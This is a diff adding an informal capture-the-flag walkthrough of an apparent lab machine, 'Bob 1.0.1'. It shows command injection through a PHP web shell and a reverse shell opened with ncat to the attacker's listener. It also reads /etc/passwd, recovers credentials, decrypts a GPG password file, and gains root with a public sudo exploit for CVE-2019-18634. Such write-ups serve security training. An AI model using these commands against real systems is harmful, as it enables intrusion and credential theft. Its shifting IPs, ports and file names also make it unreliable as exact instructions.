@@ -1,0 +1,248 @@
+##################  BOB 101 #############
+$netdiscover -i wlp2s0
+
+#open ports
+80	http Apache httpd 2.4.25
+	http-robots.txt : 4 disallowed entries
+	/login.php	/dev_shell.php	/lat_memo.html
+	/passwords.html
+
+25468	ssh		openssh 7.4p1
+
+	- nmap tells us that there are 4 entries in robots.txt
+	
+#lets use dirb and see what else we can find
+$dirb  http://192.168.1.9/ /home/cihan/Desktop/Me/SecLists/raft/data/wordlists/raft-large-directories.txt
+	
+	- dirb resuşt is /server-status and we do not have permisson to access
+	- so we stick to what we have found on robots.txt
+	- /dev_shell.php
+	- when we go to that page we see that it is a php shell
+	- try cat /etc/passwd do not work try cd ; cat /etc/passwd again doesnot work
+	- try cd && cat /etc/password   it works 
+	
+	- now it is time to get a shell
+	- set up listener on the local machine
+	
+$nc -lnvp 4444
+	- and get the reverse shell from the php shell
+	
+	- before this I want to learn the path to ncat on the victim machine
+	
+$ whereis ncat
+/usr/bin/ncat 
+
+	- and the final payload I have created  is 
+	
+$ echo "" && /usr/bin/ncat  192.168.1.8 4444 -e /bin/bash
+
+- yes now we got the connection
+
+
+lets navigate around the server so that we find what it has to offer us
+
+$cat /etc/passwd
+
+
+
+bob:x:1001:1001:Bob,,,,Not the smartest person:/home/bob:/bin/bash
+jc:x:1002:1002:James C,,,:/home/jc:/bin/bash
+seb:x:1003:1003:Sebastian W,,,:/home/seb:/bin/bash
+elliot:x:1004:1004:Elliot A,,,:/home/elliot:/bin/bash
+c0rruptedb1t:x:1000:1000:c0rruptedb1t,,,:/home/c0rruptedb1t:/bin/bash
+
+- we see this users and their home directory
+
+- when I was nagivating through the server I found a file called theadminisdumb.txt in elliots home directory
+- when a read it with cat comman
+- I found a bunch of explanation about admin and other users and also his password   "theadminisdumb"
+
+-now lets make an ssh connection with his account
+
+$ ssh -l elliot 192.168.1.5 -p 25486
+
+and we are in
+
+
+lets dig deeper 
+when I was looking in bob user directory I found a bunch of files
+
+lets look into bobs directory
+
+$ cd /home/bob/Documents
+
+$ ls -la
+
+
+
+total 20
+drwxr-xr-x  3 bob bob 4096 Mar  5  2018 .
+drwxr-xr-x 18 bob bob 4096 Mar  8  2018 ..
+drwxr-xr-x  3 bob bob 4096 Mar  5  2018 Secret
+-rw-r--r--  1 bob bob   91 Mar  5  2018 login.txt.gpg
+-rw-r--r--  1 bob bob  300 Mar  4  2018 staff.txt
+
+
+login.txt.gpg seems to be a password containinig file 
+
+$ file login.txt.gnp
+
+login.txt.gpg: GPG symmetrically encrypted data (AES cipher)
+
+it is a gpg encrypted file
+
+lets try to decrypt it 
+
+$ gpg -d login.txt.gpg
+
+it requiress a password phrase
+
+let find the phrase, as you see there is a directory called Secret
+
+$cd Secret
+$ls -la
+
+total 12
+drwxr-xr-x 3 bob bob 4096 Mar  5  2018 .
+drwxr-xr-x 3 bob bob 4096 Mar  5  2018 ..
+drwxr-xr-x 4 bob bob 4096 Mar  5  2018 Keep_Out
+
+
+$cd Keep_Out ; ls -la
+
+total 16
+drwxr-xr-x 4 bob bob 4096 Mar  5  2018 .
+drwxr-xr-x 3 bob bob 4096 Mar  5  2018 ..
+drwxr-xr-x 3 bob bob 4096 Mar  5  2018 Not_Porn
+drwxr-xr-x 2 bob bob 4096 Mar  5  2018 Porn
+
+these are two directories. In Porn directory there is a file called No_porn_4_u   and I tried this to be a passphrase
+but it wasnt
+
+In not Porn directory there is a script called notes.sh
+execute it and output is 
+
+
+-= Notes =-
+Harry Potter is my faviorite
+Are you the real me?
+Right, I'm ordering pizza this is going nowhere
+People just don't get me
+Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>
+Cucumber
+Rest now your eyes are sleepy
+Are you gonna stop reading this yet?
+Time to fix the server
+Everyone is annoying
+Sticky notes gotta buy em
+
+
+I tried a lot of things here but they were not password and finally I tried first latter of each line "HARPOCRATES"
+bum we got the passphrase
+
+
+lets decrypt the file
+
+cpy the file to /tmp and change name as login.asc
+
+$cp login.txt.gpg /tmp
+$mv login.txt.gpg login.asc
+
+
+$ gpg -d login.txt.gpg 
+
+gpg: AES encrypted data
+gpg: encrypted with 1 passphrase
+bob:b0bcat_
+
+see username is bob and password is b0bcat_
+
+
+now lets make an ssh connection using bobs account
+
+I have written a small script to find out which port is being used for ssh
+
+#!/bin/bash
+for port in `seq 1 65500` ;
+do
+  nc localhost $port 2>/dev/null;
+  echo $port
+done
+
+
+$ ssh -l bob localhost -p 25468
+
+till now we have owned two users  now its time to read flag.txt file which is located in / (root directory)
+
+$ ls -la
+
+
+
+total 88
+drwxr-xr-x  22 root root  4096 Mar  5  2018 .
+drwxr-xr-x  22 root root  4096 Mar  5  2018 ..
+drwxr-xr-x   2 root root  4096 Feb 21  2018 bin
+drwxr-xr-x   3 root root  4096 Feb 21  2018 boot
+drwxr-xr-x  17 root root  2920 Apr  1 06:25 dev
+drwxr-xr-x 114 root root  4096 Apr  1 06:26 etc
+-rw-------   1 root root   335 Mar  5  2018 flag.txt
+drwxr-xr-x   6 root root  4096 Mar  4  2018 home
+lrwxrwxrwx   1 root root    29 Feb 21  2018 initrd.img -> boot/initrd.img-4.9.0-4-amd64
+lrwxrwxrwx   1 root root    29 Feb 21  2018 initrd.img.old -> boot/initrd.img-4.9.0-4-amd64
+drwxr-xr-x  15 root root  4096 Feb 21  2018 lib
+drwxr-xr-x   2 root root  4096 Feb 21  2018 lib64
+drwx------   2 root root 16384 Feb 21  2018 lost+found
+drwxr-xr-x   3 root root  4096 Feb 21  2018 media
+drwxr-xr-x   2 root root  4096 Feb 21  2018 mnt
+drwxr-xr-x   2 root root  4096 Feb 21  2018 opt
+dr-xr-xr-x 103 root root     0 Apr  1 06:25 proc
+drwx------  16 root root  4096 Feb 28  2018 root
+drwxr-xr-x  23 root root   680 Apr  1 06:40 run
+drwxr-xr-x   2 root root  4096 Feb 21  2018 sbin
+drwxr-xr-x   3 root root  4096 Mar  4  2018 srv
+dr-xr-xr-x  13 root root     0 Apr  1 06:40 sys
+drwxrwxrwt  11 root root  4096 Apr  1 06:44 tmp
+drwxr-xr-x  10 root root  4096 Feb 21  2018 usr
+drwxr-xr-x  12 root root  4096 Feb 28  2018 var
+lrwxrwxrwx   1 root root    26 Feb 21  2018 vmlinuz -> boot/vmlinuz-4.9.0-4-amd64
+lrwxrwxrwx   1 root root    26 Feb 21  2018 vmlinuz.old -> boot/vmlinuz-4.9.0-4-amd64
+
+
+
+
+
+it readeable only by root
+
+lets do a privilege escalation
+download linux exploit suggester
+
+$wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+
+and execute it and it suggest that the machine is vulnerable to CVE-2019-18634
+
+lets download the executeable code for this and upload it to the vulnerable machine
+
+
+
+$ git clone https://github.com/Plazmaz/CVE-2019-18634.git
+
+$zip -r cve.zip  CVE
+
+$scp cve.zip bob@192.168.1.5:/tmp
+
+and go to the vulnerable machine
+
+unzip the file and execute comand
+
+$sudo ./self-contained.sh
+
+
+
+sudo: unable to resolve host Milburg-High
+uid=0(root) gid=0(root) groups=0(root)
+Exploiting!
+
+
+whoami 
+
+root
